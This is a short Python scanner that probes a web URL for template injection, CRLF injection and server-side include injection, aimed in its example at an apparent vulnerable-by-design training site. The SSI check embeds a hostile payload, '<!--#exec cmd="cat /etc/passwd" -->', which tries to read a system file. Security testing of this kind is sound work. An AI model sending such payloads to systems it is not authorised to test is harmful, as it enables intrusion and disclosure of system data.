import json
import requests
import re
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Function to create a requests session with retry strategy
def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
    return session

# Function to load JSON configuration
def load_config(file_path):
    with open(file_path, 'r') as json_file:
        return json.load(json_file)

# Function to send HTTP request
def send_request(session, url, payload):
    try:
        response = session.get(f"{url}?{payload}")
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return ""

# Advanced SSTI detection
def advanced_ssti_detection(url):
    session = create_session()
    config = load_config('configs/ssti_config.json')
    
    for item in config:
        name = item.get('name')
        payload = item.get('payload')
        response_pattern = item.get('response')

        response = send_request(session, url, payload)
        if re.search(response_pattern, response):
            print(f"Parameter might be vulnerable to {name}")
            print(f"Payload: {payload}")

# Advanced CRLF detection
def advanced_crlf_detection(url):
    session = create_session()
    config = load_config('configs/crlf_config.json')

    for item in config:
        name = item.get('name')
        payload = item.get('payload')
        response_pattern = item.get('response')

        try:
            response_headers = session.get(f"{url}?{payload}").headers
            response_headers_text = "\n".join([f"{k}: {v}" for k, v in response_headers.items()])
            if re.search(response_pattern, response_headers_text):
                print(f"Parameter might be vulnerable to {name}")
                print(f"Payload: {payload}")
                break
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Advanced SSI detection
def advanced_ssi_detection(url):
    session = create_session()
    payload = '<!--#exec cmd="cat /etc/passwd" -->'
    
    try:
        response = send_request(session, url, payload)
        if "root:" in response:
            print("The website is vulnerable to SSI injection")
        else:
            print("The website isn't vulnerable to SSI injection")
    except requests.RequestException as e:
        print(f"Request failed: {e}")

# Example usage
url_to_scan = "http://www.itsecgames.com/bugs.htm"
advanced_ssti_detection(url_to_scan)
advanced_crlf_detection(url_to_scan)
advanced_ssi_detection(url_to_scan)
